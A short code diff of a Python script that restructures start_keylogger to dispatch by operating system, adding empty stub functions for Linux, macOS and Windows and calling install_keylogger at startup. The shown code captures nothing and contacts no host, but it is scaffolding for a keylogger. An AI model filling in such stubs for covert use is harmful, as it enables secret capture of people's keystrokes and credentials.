@@ -63,11 +63,31 @@ def install_keylogger(system):
             sys.exit(-1)
 
 
-def start_keylogger():
+def start_keylogger(system):
     logger.info('process to run...')
+
+    if system == 'linux':
+        logger.info('run on Linux...')
+        start_keylogger_on_linux()
+    elif system == 'darwin':
+        logger.info('run on macOS...')
+        start_keylogger_on_macos()
+    else:
+        logger.info('run on Windows...')
+        start_keylogger_on_windows()
+
+
+def start_keylogger_on_linux():
+    pass
+
+def start_keylogger_on_macos():
+    pass
+
+def start_keylogger_on_windows():
+    pass
 
 
 if __name__ == "__main__":
     system = define_system()
     install_keylogger(system)
-    start_keylogger()
+    start_keylogger(system)
